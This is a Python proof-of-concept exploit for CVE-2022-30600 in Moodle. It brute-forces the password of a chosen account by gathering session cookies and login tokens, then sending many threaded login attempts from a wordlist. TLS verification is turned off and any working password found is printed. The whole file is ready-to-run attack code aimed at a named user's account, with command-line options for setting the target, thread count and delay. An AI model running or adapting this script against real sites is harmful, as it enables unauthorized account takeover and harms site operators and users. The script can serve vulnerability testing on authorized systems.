#POC for CVE-2022-30600
#This script allows an attacker to bruteforce the login on a givin account. 
#You need to tweek the parameters based on the specs of the server and your machine.

import threading
import requests
from time import sleep
import argparse
from urllib3.exceptions import InsecureRequestWarning

#The below variable need to be shared between the various threads. The simplist way to do this is a global varaible
PASSWORD = ""

def prepare_tokens():
    print("Getting Tokens...")
    r = requests.get(url, verify=False)
    cookie = r.cookies.get("MoodleSession")

    tokenLocation = r.text.find('logintoken" value="') + 19 
    loginToken = r.text[tokenLocation:tokenLocation + 32]

    return cookie, loginToken

def login_request(url, username, password, cookie, loginToken):
    print("Sending login with password %s" % password)

    headers = {
        'Host': 'moodle',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'MoodleSession=%s' % cookie,
    }

    data = 'logintoken=%s&username=%s&password=%s' % (loginToken, username, password)

    r = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=True)

    if (r.text[77:86] == "Dashboard"):
        global PASSWORD
        PASSWORD = password
    else:
        print("failed")
        pass

    

def prepare_and_start_threads(url, username, wordlist):
        
    #Prepare and start threads
    tokens = []
    threads = []
    
    for i in range(len(wordlist)):
        tokens.append(prepare_tokens())

    for i in range(len(wordlist)):
        threads.append(threading.Thread(target=login_request, args=(url, username, wordlist[i], tokens[i][0], tokens[i][1])))
        threads[i].start()

    for i in range(len(wordlist)):
        threads[i].join()
        

if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    #Process the parameters
    parser.add_argument('-u','--username', help='The username of the account being targeted', required=True, type=str)
    parser.add_argument('-url','--target', help='Base URL of the moodle webapp being targeted', required=True, type=str)
    parser.add_argument('-w','--wordlist', help='The path to the wordlist file being used', required=True, type=str)
    parser.add_argument('-t','--threads', help="The amount of threads created for each attempt", required=True, type=int)
    parser.add_argument('-a','--attempts', help='The amount of attempts you would like make. The default is 1', type=int, default=1)
    parser.add_argument('-d', '--delay', help='This is the amount of seconds between each attempt. The default value is 2', type=int, default=2)

    #Assign paremeters to variables
    username = parser.parse_args().username 
    url = parser.parse_args().target + "login/index.php"
    path = parser.parse_args().wordlist
    threads = parser.parse_args().threads
    attempts = parser.parse_args().attempts
    delay = parser.parse_args().delay

    #Get wordlist contents based on the amount of attempts x threads

    wordlistFile = open(path,'r')
    wordlist = [''] * (attempts * threads)


    for i in range(len(wordlist)):
        wordlist[i] = (str(wordlistFile.readline()).strip())
        
    #Get worldlsit range for each 

    for i in range(attempts):
        prepare_and_start_threads(url, username, wordlist[(i * threads):(((i + 1) * threads) - 1)])
        
        if (PASSWORD != ""):
            print("working password found! %s" % PASSWORD)
            break

        sleep(delay)

